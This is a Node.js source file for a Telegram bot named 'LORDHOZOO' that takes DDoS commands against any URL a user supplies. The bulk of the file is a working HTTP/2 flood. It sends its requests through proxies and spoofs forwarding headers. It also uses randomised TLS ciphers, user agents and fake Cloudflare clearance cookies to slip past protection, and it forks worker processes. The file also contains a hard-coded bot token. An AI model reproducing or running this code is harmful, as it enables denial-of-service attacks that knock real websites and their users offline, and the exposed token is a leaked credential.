const { Telegraf } = require('telegraf');
const bot = new Telegraf('8109698197:AAFksLBRURP3t5AcOLEJs3MCzwOLU2wzV9M');
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fakeua = require('fake-useragent');
const fs = require("fs");
let isAttacking = false;
let attackParams = {
    target: "",
    time: 0,
    rate: 0,
    threads: 0,
    proxyFile: ""
};
const welcomeMessage = `┏━━ıllıllı◌LORDHOZOO◌ıllıllı━━╼
┃  𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: LORDHOZOO
┃ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: @LORDHO,OO
┃ $𝐑𝐀𝐌: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
┃ $𝐃𝐀𝐓𝐄: ${new Date().toLocaleString()}
╚═══❖•ೋ°🤡°ೋ•❖═══╝
＼／＼／＼／＼／＼／＼／＼／＼／
Check out this TikTok video: https://vt.tiktok.com/ZSh9VGs53/`;
const mainMenu = `┏━━━•❅•°•❈👑❈•°•❅•━━━┓
╚»★ 𖤍DDOS ATTACK 𖤍★«╝
║ /start - Start bot
║ /menu - Show this menu
║ /chat - Chat with bot
║ /video - Get TikTok video URL
║ /ram - Show RAM usage
║ /date - Show current date
║ /attack - DDOS Attack options
┗━━━•❅•°•❈👸❈•°•❅•━━━┛
     ⇆ㅤ◁ㅤ ❚❚ㅤ ▷ㅤ↻`;

const attackMenu = `┏━━━•❅•°•❈⚔️❈•°•❅•━━━┓
╚»★ DDOS ATTACK OPTIONS ★«╝
║ /http_flood [url] [time] [rate] [threads] [proxyfile] - HTTP Flood
║ /slowloris [url] [time] [rate] [threads] [proxyfile] - Slowloris Attack
║ /udp_flood [url] [time] [rate] [threads] [proxyfile] - UDP Flood
║ /tcp_flood [url] [time] [rate] [threads] [proxyfile] - TCP Flood
║ /stop - Stop all attacks
┗━━━•❅•°•❈💀❈•°•❅•━━━┛`;
bot.start((ctx) => {
    ctx.reply(welcomeMessage);
    ctx.reply(mainMenu);
});
bot.command('menu', (ctx) => {
    ctx.reply(mainMenu);
});
bot.command('chat', (ctx) => {
    ctx.reply('Chat mode activated! Send me a message and I will respond.');
});
bot.command('video', (ctx) => {
    ctx.reply('Here is a TikTok video URL: https://vt.tiktok.com/ZSh9VGs53/');
});
bot.command('ram', (ctx) => {
    const ramUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    ctx.reply(`Current RAM usage: ${ramUsage} MB`);
});
bot.command('date', (ctx) => {
    ctx.reply(`Current date and time: ${new Date().toLocaleString()}`);
});
bot.command('attack', (ctx) => {
    ctx.reply(attackMenu);
});
bot.command('http_flood', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 5) {
        return ctx.reply('Usage: /http_flood [url] [time] [rate] [threads] [proxyfile]');
    }
    attackParams = {
        target: args[0],
        time: parseInt(args[1]),
        rate: parseInt(args[2]),
        threads: parseInt(args[3]),
        proxyFile: args[4],
        type: 'http_flood'
    };
    isAttacking = true;
    startAttack(ctx);
});
bot.command('slowloris', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 5) {
        return ctx.reply('Usage: /slowloris [url] [time] [rate] [threads] [proxyfile]');
    }
    attackParams = {
        target: args[0],
        time: parseInt(args[1]),
        rate: parseInt(args[2]),
        threads: parseInt(args[3]),
        proxyFile: args[4],
        type: 'slowloris'
    };
    
    isAttacking = true;
    startAttack(ctx);
});
bot.command('udp_flood', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 5) {
        return ctx.reply('Usage: /udp_flood [url] [time] [rate] [threads] [proxyfile]');
    }
    attackParams = {
        target: args[0],
        time: parseInt(args[1]),
        rate: parseInt(args[2]),
        threads: parseInt(args[3]),
        proxyFile: args[4],
        type: 'udp_flood'
    };
    
    isAttacking = true;
    startAttack(ctx);
});
bot.command('tcp_flood', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 5) {
        return ctx.reply('Usage: /tcp_flood [url] [time] [rate] [threads] [proxyfile]');
    }
    attackParams = {
        target: args[0],
        time: parseInt(args[1]),
        rate: parseInt(args[2]),
        threads: parseInt(args[3]),
        proxyFile: args[4],
        type: 'tcp_flood'
    };
    isAttacking = true;
    startAttack(ctx);
});
bot.command('stop', (ctx) => {
    isAttacking = false;
    ctx.reply('Stopping all attacks...');
});
bot.on('text', (ctx) => {
    if (ctx.message.text.toLowerCase().includes('hello')) {
        ctx.reply('Hello there! How can I help you today?');
    } else if (ctx.message.text.toLowerCase().includes('how are you')) {
        ctx.reply('I am just a bot, but thanks for asking!');
    } else {
        ctx.reply('I received your message. Type /menu to see available commands.');
    }
});
function startAttack(ctx) {
    if (!isAttacking) return;
    
    ctx.reply(`Starting ${attackParams.type} attack on ${attackParams.target} for ${attackParams.time} seconds...`);
    
    process.setMaxListeners(0);
    require("events").EventEmitter.defaultMaxListeners = 0;
    process.on('uncaughtException', function (exception) {});
    
    const sig = [    
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512'
    ];
    
    const cplist = [
        "ECDHE-ECDSA-AES128-GCM-SHA256", 
        "ECDHE-ECDSA-CHACHA20-POLY1305", 
        "ECDHE-RSA-AES128-GCM-SHA256", 
        "ECDHE-RSA-CHACHA20-POLY1305", 
        "ECDHE-ECDSA-AES256-GCM-SHA384", 
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
        'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
        'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
    ];
    
    const accept_header = [
        '*/*',
        'image/*',
        'image/webp,image/apng',
        'text/html',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
    ];
    
    const lang_header = [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA'
    ];
    
    const encoding_header = [
        'gzip, deflate, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate'
    ];
    
    const control_header = ["no-cache", "max-age=0"];
    
    const refers = [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.youtube.com/",
        "https://www.linkedin.com/",
        "https://proxyscrape.com/",
        "https://www.instagram.com/",
        "https://wwww.reddit.com/",
        "https://fivem.net/",
        "https://www.fbi.gov/"
    ];
    
    const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
    const ciphers1 = "GREASE:" + [
        defaultCiphers[2],
        defaultCiphers[1],
        defaultCiphers[0],
        ...defaultCiphers.slice(3) 
    ].join(":");
    
    const uap = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3"
    ];
    
    const version = [
        '"Chromium";v="100", "Google Chrome";v="100"',
        '"(Not(A:Brand";v="8", "Chromium";v="98"',
        '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"'
    ];
    
    const platform = ['Windows'];
    const site = ['cross-site', 'same-origin', 'same-site', 'none'];
    const mode = ['cors', 'navigate', 'no-cors', 'same-origin'];
    const dest = ['document', 'image', 'embed', 'empty', 'frame'];
    
    const useragentl = [
        '(CheckSecurity 2_0)',
        '(BraveBrowser 5_0)',
        '(ChromeBrowser 3_0)',
        '(ChromiumBrowser 4_0)'
    ];
    
    const mozilla = [
        'Mozilla/5.0 ',
        'Mozilla/6.0 ',
        'Mozilla/7.0 ',
        'Mozilla/8.0 ',
        'Mozilla/9.0 '
    ];
    
    const rateHeaders = [
        { "akamai-origin-hop": randstr(5) },
        { "source-ip": randstr(5) },
        { "via": randstr(5) },
        { "cluster-ip": randstr(5) }
    ];
    
    const rateHeaders2 = [
        { "akamai-origin-hop": randstr(5) },
        { "source-ip": randstr(5) },
        { "via": randstr(5) },
        { "cluster-ip": randstr(5) }
    ];
    
    function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }
    
    function randomIntn(min, max) {
        return Math.floor(Math.random() * (max - min) + min);
    }
    
    function randomElement(elements) {
        return elements[randomIntn(0, elements.length)];
    }
    
    function readLines(filePath) {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
    }
    
    function ip_spoof() {
        const getRandomByte = () => Math.floor(Math.random() * 255);
        return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
    }
    
    const spoofed = ip_spoof();
    const parsedTarget = url.parse(attackParams.target);
    const proxies = readLines(attackParams.proxyFile);
    
    class NetSocket {
        constructor(){}
    
        HTTP(options, callback) {
            const parsedAddr = options.address.split(":");
            const addrHost = parsedAddr[0];
            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            const buffer = new Buffer.from(payload);
    
            const connection = net.connect({
                host: options.host,
                port: options.port
            });
    
            connection.setTimeout(options.timeout * 100000);
            connection.setKeepAlive(true, 100000);
    
            connection.on("connect", () => {
                connection.write(buffer);
            });
    
            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                const isAlive = response.includes("HTTP/1.1 200");
                if (isAlive === false) {
                    connection.destroy();
                    return callback(undefined, "error: invalid response from proxy server");
                }
                return callback(connection, undefined);
            });
    
            connection.on("timeout", () => {
                connection.destroy();
                return callback(undefined, "error: timeout exceeded");
            });
    
            connection.on("error", error => {
                connection.destroy();
                return callback(undefined, "error: " + error);
            });
        }
    }
    
    const Socker = new NetSocket();
    
    if (cluster.isMaster) {
        for (let counter = 1; counter <= attackParams.threads; counter++) {
            cluster.fork();
        }
    } else {
        setInterval(() => {
            if (!isAttacking) return;
            runFlooder();
        }, 100);
    }
    
    function runFlooder() {
        if (!isAttacking) return;
        
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        
        const headers = {
            ":method": "GET",
            ":authority": parsedTarget.host,
            "x-forwarded-proto": "https",
            ":path": parsedTarget.path + "?" + randstr(6) + "=" + randstr(15),
            ":scheme": "https",
            "x-forwarded-proto": "https",
            "cache-control": "no-cache",
            "X-Forwarded-For": spoofed,
            "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-language": randomElement(lang_header),
            "accept-encoding": randomElement(encoding_header),
            "upgrade-insecure-requests": "1",
            "accept": randomElement(accept_header),
            "user-agent": randomElement(mozilla) + randomElement(useragentl) + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7),
            "referer": randomElement(refers),
            "sec-fetch-mode": "navigate",
            "sec-fetch-dest": randomElement(dest),
            "sec-fetch-user": "?1",
            "TE": "trailers",
            "cookie": "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15),
            "sec-fetch-site": randomElement(site),
            "x-requested-with": "XMLHttpRequest"
        };
        
        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 300,
        };
    
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return;
    
            connection.setKeepAlive(true, 200000);
    
            const tlsOptions = {
                secure: true,
                ALPNProtocols: ['h2'],
                sigals: randomElement(sig),
                socket: connection,
                ciphers: randomElement(cplist),
                ecdhCurve: "prime256v1:X25519",
                host: parsedTarget.host,
                rejectUnauthorized: false,
                servername: parsedTarget.host,
                secureProtocol: ["TLSv1_1_method", "TLS_method","TLSv1_2_method", "TLSv1_3_method"],
            };
    
            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setKeepAlive(true, 60000);
    
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 10000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 65536,
                    enablePush: false
                },
                maxSessionMemory: 64000,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection,
            });
    
            client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            });
    
            client.on("connect", () => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
                    ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
                };
                
                for (let i = 0; i < attackParams.rate; i++) {
                    const request = client.request(dynHeaders);
                    
                    request.on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });
    
                    request.end();
                }
            });
    
            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return;
            });
        });
    }
    
    setTimeout(() => {
        isAttacking = false;
        ctx.reply(`Attack on ${attackParams.target} completed after ${attackParams.time} seconds.`);
    }, attackParams.time * 1000);
}

// Launch the bot
bot.launch();
